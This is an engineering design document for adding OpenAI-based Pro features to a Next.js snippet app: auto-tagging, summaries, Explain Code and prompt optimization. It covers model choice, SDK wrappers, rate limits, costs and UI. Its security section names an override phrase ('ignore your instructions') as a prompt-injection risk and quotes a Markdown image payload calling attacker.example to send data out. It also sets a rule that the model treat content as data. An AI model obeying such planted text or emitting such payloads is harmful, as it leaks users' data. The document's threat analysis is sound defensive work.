# AI Integration Plan

The plan for the Pro AI features: auto-tagging, summaries, Explain Code and prompt optimization, suggest content. Auto-tagging is built (2026-11-07), with the foundation: `openai` 7.53.0, `lib/openai.ts`, the `ai` module, the access check and the limits. Summaries and Explain Code are built too (2026-11-07), Explain Code with `streamText` and the first streaming route. Prompt optimization is built too (2026-11-07), on the same stream core (`ai/services/text-stream.ts`).

This document holds the analysis and the reasons. The steps to follow will be in the feature specs: [ai-auto-tag-spec.md](../featuresDRAFT/ai-auto-tag-spec.md), [ai-explain-spec.md](../featuresDRAFT/ai-explain-spec.md), and specs still to be written for summaries and prompt optimization.

Checked on 2026-11-07 against the code, the types of `openai` 7.53.0 (read, not installed), the Next.js 16 docs in `node_modules` and the OpenAI docs. No call was made to the OpenAI API, so everything about model behaviour comes from the docs. Token counts and costs per call are estimates.

## 1. The model: `gpt-5-nano` is shutting down

The project overview, the research prompt and both specs name `gpt-5-nano`. OpenAI has marked it Deprecated, and **it leaves the API on 2026-12-11**. At that date the model "will no longer be accessible", so a feature built on it would stop working.

| Model          | Input / cached / output, per 1M tokens | Knowledge cutoff | `reasoning.effort`          | Status                              |
| -------------- | -------------------------------------- | ---------------- | --------------------------- | ----------------------------------- |
| `gpt-5-nano`   | $0.05 / $0.005 / $0.40                 | 2024-05-31       | not shown on its page       | Shutdown 2026-12-11                 |
| `gpt-5.4-nano` | $0.20 / $0.02 / $1.25                  | 2025-08-31       | none (default) to xhigh     | Shutdown 2027-04-01                 |
| `gpt-5.6-luna` | $0.20 / $0.02 / $1.20                  | 2026-02-16       | none to max, medium default | Current; OpenAI's named replacement |
| `gpt-6-luna`   | $0.10 / $0.01 / $0.50                  | 2026-05-18       | none to max, medium default | Current                             |

**The decision: `gpt-6-luna`.** It is half the price of the named replacement on input and less than half on output, its cutoff is later, and it is the replacement OpenAI names for the later shutdowns (`gpt-5.4-nano`, GPT-4.1, GPT-4o). It supports the Responses API, streaming, structured outputs and prompt caching. It costs twice as much as `gpt-5-nano` on input, and 25% more on output, which section 7 shows is small at this scale.

The model name lives in one constant, `AI_MODEL` in `ai/domain/`, so the next deprecation is a one-line change. The deprecations page says shutdown dates can also be read from `GET /v1/models` (`shutdown_date`).

## 2. Current state

### What exists

- **Pro gate:** `billing/queries.ts` `getEntitlements(userId)`, cached per request. `presignUpload` in `files/services/presign-upload.ts` is the pattern to copy: Pro check, input check, rate limit, then the work
- **Rate limits:** `lib/rate-limit.ts` `consumeRateLimit(policy, identifier)` on Upstash. It fails closed: an outage throws `RateLimitUnavailableError`. Policies are constants in the feature's `domain/`, like `PRESIGN_BY_USER`. Refusals are worded by `getTooManyAttemptsMessage` of `auth/domain/rate-limits`
- **Vendor client:** `lib/stripe.ts` creates its client on first use, so a build needs no key. `lib/openai.ts` copies this
- **Lint:** `eslint.config.mjs` already keeps `openai` and every `openai/*` path inside `lib`
- **Environment:** `OPENAI_API_KEY` is in `.env.example`
- **Markdown:** `MarkdownPreview` (private to `editor`) has raw HTML off and keeps the default URL filter
- **Architecture:** `ai` is planned at rank 4, above `billing` and `editor`, below `items`. It takes content as input and never reads items ([modules.md](modules.md))

### What is missing

- **The plan did not reach the drawer** (fixed by auto-tagging): `isPro` reached `CreateItemDialog` only. Now `canUseAi` reaches `ItemDetailView`, `ItemEditForm` and `ItemDrawerContent` from both drawers and the full item page (section 8)
- **`CodeEditor` has no slot for a button or a second view.** `EditorHeader` holds the language label and the copy button, and `editor` (rank 3) cannot import `ai` (rank 4)
- **`MarkdownPreview` is private**, and it renders images, which matters for model output (section 9)
- **There is no spec for summaries or prompt optimization**
- **The Pro lists do not mention AI.** `PRO_PLAN_FEATURES` must stay that way until a feature ships. `PricingSection` already sells AI features ("Unbuilt features on sale" in [architecture.md](architecture.md))

### Paths in the research prompt

`src/actions/*.ts` and `src/lib/usage-limits.ts` are from the old layout. The patterns are in `features/<feature>/actions/` and `billing/domain/limits.ts` with `billing/queries.ts`.

## 3. What the specs say that does not hold

[ai-auto-tag-spec.md](../featuresDRAFT/ai-auto-tag-spec.md) lists gotchas. Some still stand, others conflict with the OpenAI docs.

| Spec says                                                                                        | What the docs say                                                                                                                                                               | Decision                                                                                                                                                  |
| ------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Use `gpt-5-nano`                                                                                 | Shutdown 2026-12-11                                                                                                                                                             | `gpt-6-luna`                                                                                                                                              |
| Chat Completions returns empty content, so it does not work                                      | The model page lists Chat Completions as supported. Reasoning tokens count against the output limit, and a response can run out "before any visible output tokens are produced" | Use the Responses API anyway: OpenAI's guides lead with it. The empty content was probably a spent output limit. That is an inference, not tested         |
| `zodResponseFormat` wastes tokens and hits length limits, so use `json_object` and parse by hand | The SDK calls `json_object` "an older method" and recommends `json_schema` where the model supports it                                                                          | `zodTextFormat` with `responses.parse`. The same inference applies. Check it with one real call on the first day; if it fails, fall back to `json_object` |
| The model may return an object or a bare array                                                   | A strict schema fixes the shape                                                                                                                                                 | Parse one shape. The Zod check stays as the last guard                                                                                                    |
| `max_tokens` is not supported                                                                    | Correct: it is `max_output_tokens` on Responses                                                                                                                                 | Set it, and treat `incomplete` as a failure                                                                                                               |
| Normalize tags to lowercase                                                                      | Still needed                                                                                                                                                                    | `ai/domain/`                                                                                                                                              |
| Truncate content to 2000 characters                                                              | Still sensible for tags                                                                                                                                                         | Per-operation limits, section 7                                                                                                                           |
| `explainCode` is a Server Action                                                                 | Server Actions run one at a time ([coding-standards.md](../context/coding-standards.md)), so a slow AI call holds up the user's other actions                                   | A streaming route, section 5                                                                                                                              |
| 20 requests per hour                                                                             | Does not bound the monthly cost                                                                                                                                                 | Add a daily limit, section 7                                                                                                                              |

## 4. SDK setup

Install `openai` (7.53.0 at the time of writing). It needs Node 22 or later: `.nvmrc` says 22, `package.json` has no `engines` field, and the Node version of the Vercel project was not checked. Zod 4 is within its peer range. Check `.d.ts` in `node_modules` before each use, as the coding standards require.

`lib/openai.ts` is the only file that touches the SDK. Because the lint also blocks `openai/helpers/zod`, the `zodTextFormat` call lives here too, and features pass in a plain Zod schema. It knows nothing about tags or prompts: those belong to `ai/domain/`.

A sketch, not compiled:

```typescript
import "server-only";

import OpenAI from "openai";
import { zodTextFormat } from "openai/helpers/zod";

let client: OpenAI | undefined;

// Created on first use so a build never needs the key.
function getOpenAI(): OpenAI {
  if (client) return client;
  const apiKey = process.env.OPENAI_API_KEY;
  if (!apiKey) throw new Error("OPENAI_API_KEY is not set");
  client = new OpenAI({ apiKey, timeout: 30_000, maxRetries: 1 });
  return client;
}
```

- **`timeout`:** the default is 10 minutes, far past what a user waits or a function lives. Retries multiply it, so the worst case is about a minute
- **`maxRetries: 1`:** one retry covers a passing failure and stays inside `maxDuration`
- Every call sets `store: false`, `safety_identifier` and `max_output_tokens`. The wrappers set the first two so no caller can forget

The file exports two wrappers:

- `generateStructured({ model, instructions, input, schema, schemaName, effort, maxOutputTokens, userId })` calls `responses.parse` and returns the parsed value, or throws `AiOutputError` when the status is `incomplete`, the model refuses, or `output_parsed` is empty
- `streamText({ ..., signal })` calls `responses.stream` and yields the text of `response.output_text.delta`. It throws on `error`, `response.failed` and `response.incomplete`

`temperature` and `top_p` are never sent: OpenAI says to remove them when reasoning effort is not `none`, and the features do not need them.

### Settings per operation

| Operation           | Output                | `reasoning.effort` | `text.verbosity` | `max_output_tokens` to start |
| ------------------- | --------------------- | ------------------ | ---------------- | ---------------------------- |
| Auto-tagging        | `{ tags: string[] }`  | `none`             | `low`            | 300                          |
| Summary             | `{ summary: string }` | `none`             | `low`            | 400                          |
| Explain Code        | Markdown stream       | `low`              | `medium`         | 2,000                        |
| Prompt optimization | Text stream           | `low`              | `medium`         | 2,000                        |

These are starting points. OpenAI's guide advises a much larger reasoning buffer while experimenting (25,000 tokens), so log `usage.output_tokens_details.reasoning_tokens` and adjust. A limit set too low bills the input and the reasoning and shows the user nothing. The docs give no guidance on effort for simple tasks on Luna; the only related line is "start with `low`" for minimal effort. `none` for tags and summaries is therefore a choice to check against real output.

## 5. Server patterns

### Streaming or one answer

| Operation           | Choice                    | Why                                                                                 |
| ------------------- | ------------------------- | ----------------------------------------------------------------------------------- |
| Auto-tagging        | Server Action, one answer | Short, and a half list of tags has no use: the JSON must be whole                   |
| Summary             | Server Action, one answer | Short, and it goes into a form field the user accepts or rejects                    |
| Explain Code        | Route, streaming          | 200 to 300 words: the wait is long enough to feel, and text can be read as it comes |
| Prompt optimization | Route, streaming          | Same length, and the same reason                                                    |

This matches "AI, one answer" and "AI, streaming" in the operations table of [architecture.md](architecture.md). The Explain spec's Server Action and spinner change to a route and live text.

### One answer: the action

The same shape as `items/actions/item.ts`: parse, session outside the `try`, one service call, shape the result.

```typescript
"use server";

export async function generateAutoTags(
  data: unknown,
): Promise<ActionResult<string[] | null>> {
  const parsed = autoTagsInputSchema.safeParse(data);
  if (!parsed.success) return failure(parsed.error.issues[0].message);

  // Outside the try: a signed-out caller is redirected by a thrown error.
  const { id: userId } = await getSessionUser();

  try {
    const result = await suggestTags(userId, parsed.data);
    if (!result.success) return failure(result.error ?? GENERIC_ERROR);
    return { success: true, error: null, data: result.data };
  } catch (error) {
    await logger.error("Suggesting tags failed", { error, userId });
    return failure(AI_UNAVAILABLE_MESSAGE);
  }
}
```

No `refresh()`: nothing was written.

Server Actions run one at a time, so a slow call holds up the user's Save, pin and star until it ends. Accepted for one short answer, and bounded: each operation sets a per-request timeout (10 s for tags), so with the one retry the wait is about 20 s at most. A failure `aiErrorKind` of `lib/openai.ts` knows is returned by the service in its own words; anything else throws to the action.

### The service

Each operation's service starts with one shared check, `ai/_internal/services/access.ts`, in the order of `presignUpload`:

1. `getEntitlements(userId)`: not Pro returns `AI_PRO_ONLY_MESSAGE`
2. `consumeRateLimit` for the hourly policy, then the daily one. A refusal returns `getTooManyAttemptsMessage`
3. The caller truncates the input, builds the prompt from `ai/domain/` and calls the wrapper

An outage of Upstash throws, so the caller answers with its generic error. Nothing reaches OpenAI unchecked.

### Streaming: the route

`app/api/ai/explain/route.ts`, thin like `api/search/route.ts`, and answering with status codes because the client uses `fetch`:

- `auth()`: 401 when signed out
- Schema: 400
- The service runs the checks before the stream opens: 403 for not Pro, 429 for the limit, each as JSON in the `{ success, data, error }` shape. After the headers are sent a status can no longer change, so every refusal must come first
- Then `new Response(stream, { headers })` with `Content-Type: text/plain; charset=utf-8` and `Cache-Control: private, no-store`
- `export const maxDuration = 60`, set on purpose. Next passes it to the platform

`request.signal` goes down to `responses.stream`, so closing the drawer stops generation and the billing of further tokens. The stream turns the wrapper's async iterator into a `ReadableStream`, the pattern in `route.md` of the Next.js docs. Plain text is enough: there is one kind of event, so SSE adds parsing for nothing. An error mid-stream calls `controller.error`, which the client sees as a failed read.

The client side is a browser helper, `ai/_internal/components/stream-explanation.ts` (`import "client-only"`), called by a hook, `use-explain-code`. Per the React patterns in the standards, an abort calls no failure callback.

## 6. Error handling

Errors are logged by status and code only, never with the content. `logger.error` writes that line: the error goes in as `error` and is logged as its class, status and codes (`errorSummary`, `lib/error-summary.ts`). Users see plain words, through a toast, with their form left as it was.

| Failure                             | How it appears                                                                                                                                     | User sees                                                               | Retried?                           |
| ----------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- | ---------------------------------- |
| Not Pro                             | Service check                                                                                                                                      | "AI features require a Pro subscription"                                | No                                 |
| Our rate limit                      | `consumeRateLimit`                                                                                                                                 | `getTooManyAttemptsMessage`                                             | No                                 |
| Upstash outage                      | `RateLimitUnavailableError`                                                                                                                        | Generic error                                                           | No                                 |
| OpenAI rate limit                   | `RateLimitError` (429)                                                                                                                             | "AI is busy. Try again in a moment."                                    | SDK, once                          |
| Out of credit or over a spend limit | 429 with `credit_balance_exhausted`, `organization_spend_limit_exceeded`, `project_spend_limit_exceeded`; `error.type` can be `insufficient_quota` | "AI is unavailable right now." Log loudly: only we can fix this         | OpenAI says retrying does not help |
| Bad key                             | `AuthenticationError` (401)                                                                                                                        | "AI is unavailable right now."                                          | No                                 |
| Server error or overload            | `InternalServerError` (500, 503)                                                                                                                   | "AI is busy. Try again in a moment."                                    | SDK, once                          |
| Timeout                             | `APIConnectionTimeoutError`                                                                                                                        | "That took too long. Try again."                                        | SDK, once                          |
| Output limit reached                | `status: "incomplete"`, reason `max_output_tokens`                                                                                                 | Generic error. For a stream, keep what arrived and say it was cut short | No                                 |
| Content filter                      | `status: "incomplete"`, reason `content_filter`                                                                                                    | "AI could not answer this item."                                        | No                                 |
| Refusal                             | A `refusal` content part                                                                                                                           | "AI could not answer this item."                                        | No                                 |
| User closed the view                | `APIUserAbortError`                                                                                                                                | Nothing                                                                 | No                                 |

The SDK decides what to retry in `shouldRetry`, and it may spend its one retry on a spend error. That is harmless at `maxRetries: 1`. A failed call still uses up one count of the user's limit, which is the stricter outcome and stops a broken item from being clicked endlessly.

## 7. Cost

### Per call

Estimates at `gpt-6-luna` prices, without reasoning tokens.

| Operation           | Input limit      | Input tokens | Output tokens | Cost           |
| ------------------- | ---------------- | ------------ | ------------- | -------------- |
| Auto-tagging        | 2,000 characters | 800          | 50            | about $0.0001  |
| Summary             | 8,000 characters | 2,500        | 120           | about $0.0003  |
| Explain Code        | 8,000 characters | 3,000        | 500           | about $0.00055 |
| Prompt optimization | 8,000 characters | 1,000        | 600           | about $0.0004  |

Reasoning tokens bill as output: 500 of them on an Explain call adds about $0.00025.

### Why a daily limit

The spec's 20 requests an hour looks tight but allows 14,400 requests in a 30-day month. Pro brings in $8 a month, or $6 on the yearly plan, before Stripe's fee.

| Limits                   | Requests a month at most | All Explain, `gpt-6-luna` | All Explain, `gpt-5.6-luna` |
| ------------------------ | ------------------------ | ------------------------- | --------------------------- |
| 20 an hour               | 14,400                   | about $7.90               | about $17.30                |
| 20 an hour and 100 a day | 3,000                    | about $1.65               | about $3.60                 |

A normal user is far below either, but only the second row stays clear of the price of the plan. Per-user limits do not bound the total, though: anyone can reach Pro through a test-mode checkout, or open many accounts. So a third policy, `AI_BY_APP_DAY` (1,000 a day for the whole app, keyed `"app"`), caps the bill at about $0.10 a day of tags, whoever calls (added 2026-11-07). Prepaid credit with auto-recharge off is the outer bound: OpenAI's project spend limit only alerts and does not stop requests. The policies, in `ai/domain/rate-limits.ts`, shared by all four operations:

```typescript
export const AI_BY_USER_HOUR = {
  name: "ai:user-hour",
  limit: 20,
  windowSeconds: HOUR_SECONDS,
} as const;
export const AI_BY_USER_DAY = {
  name: "ai:user-day",
  limit: 100,
  windowSeconds: DAY_SECONDS,
} as const;
```

### What saves money

- **Only on a click.** No AI runs in the background or on save. This also keeps content from leaving without the user asking
- **Truncate before the call.** `CONTENT_MAX` is 100,000 characters; the limits above cap what one click costs. `truncateForModel` lives in `ai/domain/` with its test, and the UI says when an item was cut
- **`max_output_tokens` on every call**, and low effort. Output costs five times the input rate
- **A project spend limit in the OpenAI dashboard**, the backstop if everything else fails. It surfaces as `project_spend_limit_exceeded`
- **Log usage:** model, operation, input, output and reasoning tokens per call, without content. It sets the limits above from data instead of estimates

### What does not help

- **Prompt caching.** It starts at 1,024 tokens of visible input on GPT-5.6 and later, and our instructions are far shorter. Writes cost 1.25 times the input rate where they apply. Do not pad prompts to reach it. To keep the option open, the fixed instructions go first and the content last
- **Batch and Flex.** Half price, but built for work that can wait. Everything here has a user watching
- **A cache of answers.** The Explain spec regenerates on each click, and at $0.0005 a call a cache table costs more in code than it saves. Keep the last answer in component state, so switching between the tabs does not call again

## 8. Pro gating

- **The service is the enforcement.** The UI only follows it. A Free user calling the action or route directly gets the refusal
- **Read through `getEntitlements`**, never the session or the JWT ([ADR 0005](adr/README.md))
- **Getting the plan to the drawer:** add `canUseAi: boolean` to the `ok` result of `openUserItem` in `items/services/item-detail.ts`. Both drawers (the one fetched from `GET /api/items/[id]` and the intercepted route) get it with the detail they already load, every page works the same, and no provider prop has to be added in each layout. It stays beside the detail, not inside `ItemDetailJson`, because a save replaces the detail with the action's result. The full item page loads through `getUserItemDetailOfType` and renders the same edit form, so the page reads `getEntitlements` and passes `canUseAi` too. `cache()` does nothing in a route handler (Next.js docs, authentication guide), so `openUserItem` reads the plan once and decides both the lock and `canUseAi` from it; a type open to every plan pays one read per open
- **`CreateItemDialog`** already has `isPro`
- **`past_due`:** decided on 2026-11-07: AI is allowed during the grace period, under the same limits. `PRO_STATUSES` already grants Pro there ([ADR 0011](adr/README.md)) and a second rule would be the only exception to it, while the daily limit caps the cost of an unpaid month at about $1.65. The service checks `isPro` only, with no status check of its own
- **What Free users see:** the specs differ, and both are kept. The Suggest Tags button is hidden in forms. The Explain button in the read view shows a Crown and a tooltip, "AI features require Pro subscription", linking to `/upgrade`
- **Selling it:** each feature adds its line to `PRO_PLAN_FEATURES` in the commit that ships it

## 9. Security

### The key

- `OPENAI_API_KEY` is read only in `lib/openai.ts`, which starts with `import "server-only"`. No `NEXT_PUBLIC_` prefix, and never `dangerouslyAllowBrowser`
- A key per environment, in a dedicated OpenAI project with its own spend limit. Whether the key is set on Vercel was not checked

### What the user's content does

- Input goes through Zod first: type, and a hard ceiling. `ai` cannot import `CONTENT_MAX` from `items`, so `ai/domain/` has its own `AI_INPUT_MAX`, also 100,000, so a long item is truncated instead of refused
- Item content is untrusted, including the user's own: a snippet copied from the web can hold text like "ignore your instructions". There is no filter that makes this safe, so the design limits what such text can reach:
  - The model has **no tools**, and sees only the one item
  - Content goes in `input`, the rules in `instructions`, and the instructions say the content is data to describe, not orders to follow
  - The worst outcome is a wrong answer, or text written to mislead, shown to the user who sent it
- **Output is untrusted too:**
  - Tags pass a strict schema, then get lowercased, trimmed and capped in length and number. They reach the form as text, and the user accepts each one
  - Markdown from the model **must not load images**. `MarkdownPreview` renders them today, so a planted instruction could produce `![](https://attacker.example/?data=...)` and the browser would send the data out without a click. When `MarkdownPreview` moves to `components/`, add a mode that drops `img` for AI output. Raw HTML is already off and unsafe URLs are already stripped
  - Links stay, opening in a new tab with `noopener`, and need a click

### Privacy

- `store: false` on every call. Without it, the Responses API keeps response data for at least 30 days, and we never read a response back
- OpenAI does not train on API data unless we opt in. Abuse-monitoring logs are kept for up to 30 days whatever `store` says
- `safety_identifier` is `sha256Hex(userId)` from `lib/hash.ts`, as OpenAI advises: it helps them trace abuse to one user without identifying that user
- Snippets can contain secrets. Sending on a click only is the main protection. Scanning for keys before sending is not in the specs; see section 14
- The footer mentions privacy, but the app has no privacy page. Saying that content goes to OpenAI needs a place before live mode
- Never log prompts, content or model output, which is why section 6 logs only status and code

### The routes

- A Server Action gets Next's origin check, a route does not. The session cookie's `SameSite` setting covers the cross-site case; check it when the first route lands
- `Cache-Control: private, no-store` on every answer, as the other routes do

## 10. UI patterns

From "UI/UX" in the [coding standards](../context/coding-standards.md).

### Suggest Tags

- A Sparkles button, ghost variant, next to the Tags field in `ItemFields`. It is disabled while pending, with a `Loader2` spinner and the label `Suggesting…`, and disabled when the title and content are both empty
- Suggestions appear as badges under the field, each with an accept (check) and a reject (X) control with `aria-label`s
- **Accept** adds to the comma-separated `tags` value through `parseTagInput`, so duplicates fall away, and stops at `TAGS_MAX`. Nothing is saved until the form's own Save: the suggestion only changes the form. That also means `useDirtyCloseGuard` works unchanged
- **Reject** removes the badge. Suggestions already in the field are not shown
- Not optimistic: the server decides the data, and there is nothing to roll back
- Reserve the row's space while pending, so the form does not jump
- A failure is a toast, and the form keeps the input

### Summary

- A button by the Description field, in the same forms. The result is a preview with Accept and Dismiss, and Accept fills `description`. **No migration:** `Item.description` exists and `DESCRIPTION_MAX` is 2,000. The output schema caps the summary below that
- If the field already has text, Accept replaces it, and the preview says so. It never overwrites without a click

### Explain Code

Only for snippets and commands, only in the read view.

- `CodeEditor` gets two optional props, filled by `items`: `headerActions`, placed before the copy button, and `view`, shown instead of Monaco. `editor` stays unaware of `ai`, as [modules.md](modules.md) requires. `ItemBody` composes `ExplainButton` and the explanation from `ai`
- After the first click, Code and Explain tabs appear in the header and the text streams into the Explain tab
- Before the first words, a spinner. After them, the text grows in a box that scrolls at `MAX_HEIGHT`, so the drawer does not jump
- Screen readers: do not put a live region on the growing text. Announce once when it is done
- Closing the drawer or leaving the item aborts the request. An error before any text is a toast and returns to Code. An error during the text keeps it, with a note that it was cut short
- The result lives in component state. A Regenerate control is the only thing that calls again after the first answer

### Prompt optimization

Only for items of type prompt, with the same stream. Since the output would replace something the user wrote:

- In the read view, a Sparkles Optimize button shows the result in place of the original (Original / Optimized), with Copy
- Built differently from this first draft: the user asked to be offered the result, so "Use this prompt" saves it as the content through a narrow `items` action (`replaceItemContent`), not the edit form. It is not offered for an answer cut short, for a prompt longer than what the model read (the rest would be lost), for an unchanged answer, or for an answer with an image (the read view would load it)

### Everywhere

- Say it is AI: the Sparkles icon on every result, so a wrong answer is not read as a fact from the app
- Esc and focus: the result areas are inside the existing sheet and dialogs, which already return focus

## 11. Files

### The foundation (with the first feature)

| File                                                 | What                                                                          |
| ---------------------------------------------------- | ----------------------------------------------------------------------------- |
| `src/lib/openai.ts`, test                            | Client, `generateStructured`, `streamText`, `AiOutputError` |
| `eslint.config.mjs`                                  | `ai: 4` in `FEATURE_RANKS`                                                    |
| `docs/modules.md`, `context/architecture-rules.md`   | Move `ai` from planned to built, and correct its status                       |
| `src/features/ai/domain/model.ts`                    | `AI_MODEL`, the per-operation settings                                        |
| `src/features/ai/domain/rate-limits.ts`              | `AI_BY_USER_HOUR`, `AI_BY_USER_DAY`                                           |
| `src/features/ai/domain/input.ts`, test              | `AI_INPUT_MAX`, the per-operation limits, `truncateForModel`                  |
| `src/features/ai/schemas.ts`, test                   | Input and output schemas                                                      |
| `src/features/ai/_internal/services/access.ts`, test | Pro and limit checks                                                          |

### Per feature

| Feature              | Files                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Auto-tagging         | `ai/domain/tags.ts` (prompt, normalizing, test), `ai/services/auto-tags.ts` (test), `ai/actions/auto-tags.ts`, `ai/components/AiTagSuggestions.tsx` (was `SuggestTagsButton.tsx`), `ai/_internal/components/TagSuggestions.tsx`; changes in `items/_internal/components/ItemFields.tsx` and `TagsField.tsx`; `canUseAi` in `items/services/item-detail.ts`, `api/items/[id]/route.ts` and the drawer                                                                                                                                                                                                |
| Explain Code (built) | `streamText` in `lib/openai.ts` (test), `ai/domain/explain.ts` (test), `ai/services/explain.ts` (test) with `_internal/services/stream-deadlines.ts`, `app/api/ai/explain/route.ts` (test), `ai/components/AiCodeExplanation.tsx` with `ExplainButton`, `ExplainViewToggle`, `ExplanationView`, `stream-explanation.ts`, `use-explain-code`, `use-frame-text` in `_internal`; changes in `editor/components/CodeEditor.tsx` (slots), `MarkdownPreview` (moved to `components/`, `images` required), `items/_internal/components/ItemBody.tsx`, `ItemDrawerContent.tsx`; `components/ui/tooltip.tsx` |
| Summary (built)      | `ai/domain/summary.ts` (test), `ai/services/summary.ts` (test), `ai/actions/summary.ts`, `ai/components/AiDescriptionSummary.tsx` with `GenerateWithAiButton` and `SummaryPreview` in `_internal`; `items/_internal/components/DescriptionField.tsx`, `aiSource` in `items/domain/item-fields.ts`                                                                                                                                                                                                                                                                                                   |
| Prompt optimization  | `ai/domain/prompt-optimizer.ts`, `ai/services/prompt-optimizer.ts`, `app/api/ai/optimize-prompt/route.ts`, the view in `ai/components/`                                                                                                                                                                                                                                                                                                                                                                                                                                                             |

`use-explain-code` is used through `ExplainButton`, so if `items` needs only the components, it can stay in `_internal/` (rule 9). Prompts are in `domain/`, since they are pure strings and the vendor's meaning for the product (rule 8).

## 12. Testing

### Unit (Vitest)

- `ai/domain`: tag normalizing (lowercase, trim, duplicates, length, count), `truncateForModel` at and past each limit, prompt builders keep content out of the instructions
- `ai/schemas.ts`: over the ceiling, empty content
- `access.ts` and the services, with `@/lib/openai`, `@/lib/rate-limit` and `getEntitlements` mocked: Free refused before any OpenAI call; a limit refused before any OpenAI call; hourly and daily both counted; an outage reaches no OpenAI call
- `lib/openai.ts`, with the SDK mocked: `incomplete`, a refusal and an empty parse all throw; `store: false` and `safety_identifier` are always sent; a mid-stream failure ends the iterator with a throw

### Against the real API, on the first day

- One `responses.parse` with `zodTextFormat` on `gpt-6-luna`, which settles the spec's claim in section 3
- `reasoning.effort: "none"` with structured output: quality of tags on a few real snippets
- Reasoning tokens used at `low` for Explain, to set `max_output_tokens`
- `text.verbosity` is accepted by `gpt-6-luna`: its page does not list it, though the SDK types have it

### Browser

Pro and Free accounts on each feature; a limit reached; closing the drawer mid-stream (no error toast); an injected image in a snippet does not load; a Free user calling the route directly gets 403.

## 13. Implementation order

1. **Before anything else:** create the OpenAI project, key and spend limit, and check the Node version on Vercel
2. **Auto-tagging**, with the foundation in section 11. The smallest feature, and it proves `generateStructured`. It also brings `canUseAi` to the drawer, since the edit form needs it
3. **Explain Code.** It proves streaming, and carries the `CodeEditor` changes and `canUseAi` on the full item page
4. **Summary**, once its spec exists. Mostly a copy of step 2
5. **Prompt optimization**, once its spec exists. Mostly a copy of step 3

Each is its own branch, reviewed by the `architecture-reviewer` agent first.

## 14. Known risks and open decisions

- **The specs name a dead model.** `context/project-overview.md`, `featuresDRAFT/ai-auto-tag-spec.md`, `featuresDRAFT/ai-explain-spec.md` and the research prompt need `gpt-6-luna`, and the auto-tag spec needs its gotchas corrected per section 3. Those files are not changed by this research
- **Untested claims.** No call has been made. `none` effort, verbosity on Luna and the structured output claim are all checked on the first day (section 12)
- **Models keep leaving.** `gpt-6-luna` has no shutdown date today, but `gpt-5-nano` lasted about 16 months from its snapshot to its shutdown. `GET /v1/models` shows `shutdown_date`; check it with each dependency update
- **The 100 a day limit** is a judgment from estimated costs, and the usage logs should correct it
- **Secrets in snippets.** A click sends the content as it is. A check for common key formats before sending would be a real gain, but it is not in the specs, so it is left out. Decide before live mode
- **No privacy page**, while content now goes to a third party. Needed before live mode
- **A failed call uses up a count.** Accepted: stricter, and limits are generous for normal use
- **Prompt injection** is limited, not solved (section 9)

## Sources

- OpenAI models: [gpt-5-nano](https://developers.openai.com/api/docs/models/gpt-5-nano), [gpt-5.4-nano](https://developers.openai.com/api/docs/models/gpt-5.4-nano), [gpt-5.6-luna](https://developers.openai.com/api/docs/models/gpt-5.6-luna), [gpt-6-luna](https://developers.openai.com/api/docs/models/gpt-6-luna), [Deprecations](https://developers.openai.com/api/docs/deprecations), [Latest model guide](https://developers.openai.com/api/docs/guides/latest-model)
- OpenAI guides: [Structured outputs](https://developers.openai.com/api/docs/guides/structured-outputs), [Reasoning](https://developers.openai.com/api/docs/guides/reasoning), [Streaming](https://developers.openai.com/api/docs/guides/streaming-responses), [Prompt caching](https://developers.openai.com/api/docs/guides/prompt-caching), [Error codes](https://developers.openai.com/api/docs/guides/error-codes), [Data controls](https://developers.openai.com/api/docs/guides/your-data), [Safety best practices](https://developers.openai.com/api/docs/guides/safety-best-practices)
- `openai` 7.53.0 types: `client.d.ts`, `core/error.d.ts`, `helpers/zod.d.ts`, `resources/responses/responses.d.ts`, `resources/shared.d.ts`
- Next.js docs in `node_modules/next/dist/docs/`: `route.md` (streaming), `02-route-segment-config/maxDuration.md`
- This repository: [modules.md](modules.md), [architecture.md](architecture.md), [coding-standards.md](../context/coding-standards.md), [architecture-rules.md](../context/architecture-rules.md), `lib/rate-limit.ts`, `files/services/presign-upload.ts`, `billing/queries.ts`, `items/actions/item.ts`
